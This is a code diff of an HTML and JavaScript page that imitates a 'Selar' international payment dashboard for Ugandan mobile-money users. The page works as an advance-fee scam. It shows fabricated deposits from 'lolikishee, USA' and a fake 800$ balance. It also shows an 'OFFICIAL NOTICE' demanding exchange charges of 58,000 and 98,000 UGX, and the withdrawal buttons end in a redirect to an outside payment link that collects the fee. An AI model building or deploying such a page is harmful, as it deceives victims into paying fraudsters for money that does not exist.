@@ -91,20 +91,23 @@
         .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; margin: 15px 0; height: 10px; }
         .progress-bar { width: 0%; height: 100%; background-color: var(--success-green); border-radius: 10px; transition: width 0.1s linear; }
 
-        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
-        .modal { background: white; padding: 25px; border-radius: 8px; max-width: 420px; width: 100%; text-align: center; box-shadow: 0 0 20px rgba(0,0,0,0.3); }
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
+        .modal { background: white; padding: 25px; border-radius: 8px; max-width: 400px; width: 100%; text-align: center; }
 
-        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 15px auto; }
+        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid var(--jpesa-blue); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 10px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        
+        .paid-badge { background: #e8f5e9; border: 2px dashed #4caf50; padding: 10px; border-radius: 5px; color: #2e7d32; text-align: center; }
+        .notice-box { background: #fff3e0; border-left: 5px solid #ff9800; padding: 15px; color: #e65100; font-size: 0.9rem; }
     </style>
 </head>
 <body>
 
 <div class="container" id="app">
     <div class="top-banner">
-        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center; cursor: pointer;" onclick="configInvoice800()">
+        <div style="background: white; padding: 5px; border-radius: 4px; display: flex; align-items: center; cursor:pointer;" onclick="triggerVisaConfig()">
             <span style="color:#0033a0; font-weight:bold; font-size: 10px;">Selar visa MasterCard Invoice</span>
         </div>
     </div>
@@ -140,12 +143,12 @@
         </div>
 
         <div id="mainNotif" class="receipt-card">
-            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;">Successfully registered your SIM Card on Selar system. Send/Receive globally.</p>
+            <p id="notifText" style="font-size: 0.85rem; color: #444; margin: 0;">OFFICIAL NOTICE: Your SIM Card doesn't support dollar deposit. Recharge with exchange charge of 58,000UGX. Click withdrawal and fill 07XXXXX.</p>
         </div>
 
         <div style="display:flex; gap:10px; margin-top:15px;">
-            <button class="btn-action" style="margin:0; background: var(--jpesa-blue);" onclick="handleAction()">Withdrawal</button>
-            <button class="btn-action" style="margin:0; background: #444;" onclick="handleAction()">Receive</button>
+            <button class="btn-action" style="margin:0; background: var(--jpesa-blue);" onclick="initiateWithdrawal()">Withdrawal</button>
+            <button class="btn-action" style="margin:0; background: #444;" onclick="initiateWithdrawal()">Receive</button>
         </div>
 
         <div class="payment-grid">
@@ -158,9 +161,9 @@
         <div id="recentActivity" class="receipt-card" style="border-top: 3px solid var(--success-green);">
             <div style="display:flex; align-items:center; margin-bottom: 10px;">
                 <label style="margin:0;">Recent Activity</label>
-                <span id="liveTag" class="">LIVE</span>
+                <span class="live-tag">LIVE</span>
             </div>
-            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.95rem; background: #f0fdf4; padding: 10px; border-radius: 5px;">No transactions</div>
+            <div id="activityLog" style="color: var(--jpesa-blue); font-weight: bold; font-size: 0.95rem; background: #f0fdf4; padding: 10px; border-radius: 5px;">Received 200.00$ from lolikishee, USA</div>
         </div>
     </div>
 </div>
@@ -170,15 +173,12 @@
 </div>
 
 <script>
-    let state = JSON.parse(localStorage.getItem('selarStateChicagoCmd')) || { step: 0, name: '', phone: '' };
-
-    window.onload = () => { if(state.step > 0) renderStep(); };
-
-    function save() { localStorage.setItem('selarStateChicagoCmd', JSON.stringify(state)); }
+    let userData = { name: '', phone: '' };
+    let isUpgraded = false;
 
     function register() {
-        state.name = document.getElementById('regName').value;
-        state.phone = document.getElementById('regPhone').value;
+        userData.name = document.getElementById('regName').value;
+        userData.phone = document.getElementById('regPhone').value;
         
         const ov = document.getElementById('overlay');
         ov.style.display = 'flex';
@@ -193,9 +193,7 @@
             if (width >= 100) {
                 clearInterval(interval);
                 ov.style.display = 'none';
-                state.step = 1;
-                save();
-                renderStep();
+                renderDashboard();
             } else {
                 width += 2;
                 document.getElementById('regProgress').style.width = width + '%';
@@ -204,89 +202,103 @@
         }, 100);
     }
 
-    function renderStep() {
+    function renderDashboard() {
         document.getElementById('loginPage').style.display = 'none';
         document.getElementById('dashboard').style.display = 'block';
-        document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;
-
-        if(state.step === 1) {
-            document.getElementById('notifText').innerHTML = `OFFICIAL NOTICE: Your SIM Card doesn't support dollar deposit. Recharge with exchange charge of <b style="color: var(--jpesa-red);">58,000UGX</b>. Click withdrawal and fill 07XXXXX.`;
-        }
-
-        if(state.step === 2) { // Paid 58k
-            document.getElementById('notifText').innerHTML = `<div style="padding:10px; border: 2px solid var(--success-green); border-radius:10px; background:#f0fdf4; color:var(--success-green); font-weight:bold; text-align:center;">PAID! foreign exchange exchange charge of 58,000UGX by ${state.name} (${state.phone})</div>`;
-            document.getElementById('activityLog').innerText = "Received 200.00$ from lolikishee, USA";
-        }
-
-        if(state.step === 3) { // 800$ configured
-            document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
-            document.getElementById('usdBalance').innerText = "800.00$";
-            document.getElementById('usdBalance').classList.add('blink-green');
-            document.getElementById('liveTag').classList.add('live-tag');
-            document.getElementById('notifText').innerHTML = `Foreign exchange charge needed <b>98,000UGX</b> to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX and you allow notification to deposit invoice transaction on Your mobile number account`;
-            document.getElementById('activityLog').innerHTML = `<span style="color:#e91e63">Received Amount 800.00$ from lolikishee, USA CHICAGO</span>`;
-            document.getElementById('activityLog').style.background = "linear-gradient(45deg, #f0fdf4, #e0f2fe)";
-        }
+        document.getElementById('userInfoDisplay').innerText = `${userData.name} | ${userData.phone}`;
     }
 
     function confirmEpay() {
-        if(state.step >= 2) return;
         const ov = document.getElementById('overlay');
         ov.style.display = 'flex';
-        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Confirming payment of Foreign exchange charge by ${state.name} (${state.phone})</p>`;
+        document.getElementById('modalContent').innerHTML = `
+            <div class="loading-ring"></div>
+            <p>Confirming payment of Foreign exchange charge by ${userData.name} and ${userData.phone}</p>
+        `;
         
         setTimeout(() => {
             ov.style.display = 'none';
-            state.step = 2;
-            save();
-            renderStep();
+            document.getElementById('notifText').innerHTML = `
+                <div class="paid-badge">
+                    <strong>PAID!</strong> foreign exchange exchange charge of 58,000UGX by ${userData.name} (${userData.phone})
+                </div>
+            `;
         }, 10000);
     }
 
-    function handleAction() {
-        if(state.step === 3) {
+    function initiateWithdrawal() {
+        const ov = document.getElementById('overlay');
+        ov.style.display = 'flex';
+
+        if(isUpgraded) {
             window.location.href = "https://pay.guto.app/@selara4?a=98000";
             return;
         }
 
-        const ov = document.getElementById('overlay');
-        ov.style.display = 'flex';
-        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>initiating transactions of 743,000UGX to ${state.name} (${state.phone})</p>`;
-        
+        document.getElementById('modalContent').innerHTML = `
+            <div class="loading-ring"></div>
+            <p>initiating transactions of 743,000UGX to ${userData.name} and ${userData.phone}</p>
+        `;
+
         setTimeout(() => {
             document.getElementById('modalContent').innerHTML = `
-                <div style="padding:20px;">
-                    <h3 style="color:var(--jpesa-red)">Withdrawal Denied</h3>
-                    <p style="font-size:0.9rem; line-height:1.5; color:#555;">Accuse us our Customer, Selar system Can't allow withdraw of international transaction which is less than 1million Ugandan Shillings, Please Consult the sender to top up the invoice to enable the withdraw directly to your Sim card</p>
-                    <button class="btn-action" onclick="document.getElementById('overlay').style.display='none'">okay have understood!</button>
+                <div class="notice-box">
+                    <strong>Accuse us our Customer, Selar system</strong><br><br>
+                    Can't allow withdraw of international transaction which is less than 1million Ugandan Shillings, 
+                    Please Consult the sender to top up the invoice to enable the withdraw directly to your Sim card.
                 </div>
+                <button class="btn-action" style="margin-top:20px;" onclick="closeModal()">okay have understood!</button>
             `;
         }, 10000);
     }
 
-    function configInvoice800() {
-        if(state.step < 2 || state.step === 3) return;
+    function triggerVisaConfig() {
         const ov = document.getElementById('overlay');
         ov.style.display = 'flex';
-        document.getElementById('modalContent').innerHTML = `<div class="loading-ring"></div><p>Configuring selar invoice transaction of 800$ to Your Selar account</p>`;
-        
+        document.getElementById('modalContent').innerHTML = `
+            <div class="loading-ring"></div>
+            <p>Configuring selar invoice transaction of 800$ to Your Selar account</p>
+        `;
+
         setTimeout(() => {
             document.getElementById('modalContent').innerHTML = `
-                <div style="padding:10px;">
-                    <h3>Deposit Detected</h3>
-                    <p style="font-size:0.9rem; text-align:left;"><b>Amount:</b> 800$<br><b>Sender ID:</b> A001112<br><b>Name:</b> lolikishee<br><b>Address:</b> USA CHICAGO</p>
-                    <p style="font-size:0.8rem; color:#666;">Press confirm to initiate the transaction on Your Selar account.</p>
-                    <button class="btn-action" onclick="finalize800()">Confirm</button>
+                <div style="text-align:left; padding:10px; background:#e3f2fd; border-radius:8px;">
+                    <h3 style="color:var(--jpesa-blue); margin-top:0;">Deposit Detected</h3>
+                    <p><strong>Deposit:</strong> 800$</p>
+                    <p><strong>Sender ID:</strong> A001112</p>
+                    <p><strong>Name:</strong> lolikishee</p>
+                    <p><strong>Address:</strong> USA CHICAGO</p>
                 </div>
+                <p style="font-size:0.8rem; margin:15px 0;">Press confirm to initiate the transaction on Your Selar account.</p>
+                <button class="btn-action" style="background:var(--jpesa-blue);" onclick="upgradeDashboard()">Confirm</button>
             `;
         }, 10000);
     }
 
-    function finalize800() {
+    function upgradeDashboard() {
+        isUpgraded = true;
+        closeModal();
+        
+        // Update Balances
+        document.getElementById('ugxBalance').innerText = "2,906,702.40UGX";
+        document.getElementById('usdBalance').innerText = "800.00$";
+        
+        // Update Notification
+        document.getElementById('notifText').innerHTML = `
+            <div style="color: #d32f2f; font-weight: bold; font-size: 0.9rem; border: 1px solid #ffcdd2; padding: 10px; background: #fff;">
+                Foreign exchange charge needed 98,000UGX to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX and you allow notification to deposit invoice transaction on Your mobile number account
+            </div>
+        `;
+
+        // Update Activity
+        const log = document.getElementById('activityLog');
+        log.style.background = "#fff9c4";
+        log.style.color = "#f57c00";
+        log.innerHTML = `Received Amount <span class="blink-green">800.00$</span> from lolikishee, USA CHICAGO`;
+    }
+
+    function closeModal() {
         document.getElementById('overlay').style.display = 'none';
-        state.step = 3;
-        save();
-        renderStep();
     }
 </script>
 </body>
